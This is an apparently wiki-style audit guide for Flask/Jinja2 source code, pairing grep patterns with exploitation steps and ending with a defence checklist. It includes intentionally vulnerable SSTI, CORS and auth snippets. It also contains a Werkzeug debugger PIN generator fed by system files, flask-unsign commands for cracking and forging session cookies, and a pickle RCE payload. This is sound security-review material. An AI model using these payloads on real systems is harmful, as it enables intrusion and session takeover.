---
title: Flask / Jinja2 source code audit patterns
slug: flask-audit-patterns
aliases: [Flask audit, Werkzeug debugger, Flask SSTI, Flask session forgery, itsdangerous]
---

> **TL;DR:** Flask's simplicity hides sharp edges — `render_template_string` with user input is instant SSTI, the Werkzeug debugger PIN is computable from `/proc`, session cookies are signed but not encrypted, and pickle-backed sessions give free RCE. This note maps the grep-to-exploit patterns for Flask/Jinja2 source review.

## 1 — SSTI via `render_template_string`

The single most critical Flask pattern. `render_template` with a file path is safe (user input is data); `render_template_string` with user input in the template source is SSTI:

```python
# VULNERABLE — user input IS the template
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    return render_template_string(f'Hello {name}!')  # SSTI

# SAFE — user input is context data
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    return render_template_string('Hello {{ name }}!', name=name)
```

**Grep pattern:**

```bash
grep -rn "render_template_string" --include="*.py" .
# Then trace whether any argument includes user-controlled data
# Also check: Jinja2 Environment().from_string(), Template()
grep -rn "from_string\|Template(" --include="*.py" .
```

**Exploitation:** once confirmed, use Jinja2 RCE chains from [[ssti]] and [[python-ssti-jinja]].

## 2 — Werkzeug debugger PIN recovery

When `FLASK_DEBUG=1` or `app.run(debug=True)` is set in production (more common than it should be), the Werkzeug interactive debugger is exposed at `/__debugger__`. It requires a PIN, but the PIN is computed deterministically:

```python
# PIN inputs (all readable via SSRF, LFI, or info disclosure):
# 1. username       — /proc/self/environ (USER) or /etc/passwd
# 2. modname        — "flask.app" (hardcoded)
# 3. appname        — "Flask" (or getattr(app, '__name__'))
# 4. modpath        — /proc/self/cmdline → find flask/app.py path
# 5. MAC address    — /sys/class/net/eth0/address (hex → int)
# 6. machine-id     — /etc/machine-id + /proc/sys/kernel/random/boot_id
#                      + /proc/self/cgroup (Docker container ID)
```

```python
import hashlib, itertools

def generate_pin(username, modname, appname, modpath, mac_int, machine_id):
    """Werkzeug >= 2.0 uses SHA-1; older used MD5."""
    h = hashlib.sha1()
    for bit in (username, modname, appname, modpath, str(mac_int), machine_id):
        h.update(bit.encode('utf-8') if isinstance(bit, str) else bit)

    num = f'{int(h.hexdigest(), 16) % 10**9:09d}'
    pin = f'{num[:3]}-{num[3:6]}-{num[6:]}'
    return pin
```

**Grep pattern:**

```bash
grep -rn "debug\s*=\s*True\|FLASK_DEBUG\|FLASK_ENV.*development" --include="*.py" .
grep -rn "use_debugger\|use_reloader" --include="*.py" .
```

## 3 — Session cookie forgery (itsdangerous)

Flask sessions are **signed but not encrypted**. The cookie is a base64-encoded JSON payload + HMAC signature. If you know `SECRET_KEY`, you can forge any session:

```bash
# Decode a Flask session cookie (no key needed)
pip install flask-unsign
flask-unsign --decode --cookie 'eyJhZG1pbiI6ZmFsc2V9.ZT...'
# Output: {'admin': False}

# Brute-force the secret key
flask-unsign --unsign --cookie 'eyJhZG1pbiI6ZmFsc2V9.ZT...' \
  --wordlist /usr/share/wordlists/rockyou.txt

# Forge a new cookie
flask-unsign --sign --cookie "{'admin': True}" --secret 'supersecret'
```

**Grep for weak secrets:**

```bash
grep -rn "SECRET_KEY\|secret_key" --include="*.py" --include="*.cfg" --include="*.env" .
# Common weak patterns:
# app.secret_key = 'development'
# SECRET_KEY = os.urandom(16)     # regenerates on restart — breaks sessions but not forgeable
# SECRET_KEY = 'change-me'        # default from tutorial
```

## 4 — Pickle session backend (RCE)

Flask's default session is client-side (cookie). Server-side session backends (Flask-Session) can use pickle:

```python
# Vulnerable config
app.config['SESSION_TYPE'] = 'filesystem'  # or 'redis', 'memcached'
# Flask-Session serialises with pickle by default
```

If an attacker can write to the session store (Redis without auth, filesystem write, or Memcached injection via [[ssrf-internal-service-exploitation]]), they can inject a pickle payload:

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
# Write to Redis: SET session:<session-id> <payload>
```

**Grep pattern:**

```bash
grep -rn "SESSION_TYPE\|pickle\|loads\b" --include="*.py" .
grep -rn "flask.session\|flask_session" --include="*.py" .
```

## 5 — Blueprint scoping and decorator issues

```python
# Missing @login_required on a blueprint route — common when blueprints
# are registered separately and decorators aren't applied consistently
admin_bp = Blueprint('admin', __name__, url_prefix='/admin')

@admin_bp.route('/users')
def list_users():          # no auth decorator — accessible to anyone
    return jsonify(User.query.all())
```

**Grep pattern:**

```bash
# Find routes without auth decorators
grep -rn "@.*\.route(" --include="*.py" . | grep -v "login_required\|auth\|permission\|roles"
# Cross-reference with blueprint registration
grep -rn "register_blueprint\|Blueprint(" --include="*.py" .
```

Also check `before_request` handlers — they may enforce auth for one blueprint but not another.

## 6 — CORS misconfiguration

```python
# Dangerous: reflecting the Origin header
from flask_cors import CORS
CORS(app, origins="*", supports_credentials=True)  # credentials + wildcard

# Or manual:
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    response.headers['Access-Control-Allow-Origin'] = origin  # reflected
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**Grep pattern:**

```bash
grep -rn "Access-Control-Allow-Origin\|CORS\|cors" --include="*.py" .
grep -rn "supports_credentials\|allow_credentials" --include="*.py" .
```

## 7 — Other patterns to check

| Pattern | Grep | Risk |
|---------|------|------|
| SQL injection | `execute(f"`, `execute("...".format(`, `%s` without parameterised queries | SQLi |
| Open redirect | `redirect(request.args.get('next'))` | Phishing, OAuth token theft |
| File upload | `save(filename)` without `secure_filename()` | Path traversal write |
| Insecure deserialization | `yaml.load(`, `pickle.loads(`, `jsonpickle` | RCE |
| Debug endpoints | `@app.route('/debug')`, `/admin` without auth | Info disclosure, RCE |
| Hardcoded credentials | `password =`, `token =`, `api_key =` in source | Credential leak |

```bash
# Comprehensive initial grep
grep -rn "render_template_string\|from_string\|Template(\|\.execute(\|pickle\.\|yaml\.load\|debug.*True\|SECRET_KEY\|secret_key" --include="*.py" .
```

## Defence checklist
- Never use `render_template_string` with user input — use `render_template` with context variables.
- Never run with `debug=True` in production; set `FLASK_ENV=production`.
- Use a strong, unique `SECRET_KEY` loaded from environment variables; rotate periodically.
- If using server-side sessions, switch serialiser from pickle to JSON.
- Apply auth decorators at the blueprint level with `before_request`, not per-route.
- CORS: never reflect `Origin` with `credentials: true`; use an explicit allowlist.

See also [[ssti]], [[python-ssti-jinja]], [[python-code-auditing]], [[python-dangerous-sinks]], [[django-audit-patterns]].

## References
- [HackTricks — Flask](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/flask.html) — audit checklist
- [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) — session cookie cracking tool
- [Werkzeug Debugger PIN exploit](https://www.daehee.com/werkzeug-console-pin-exploit/) — step-by-step
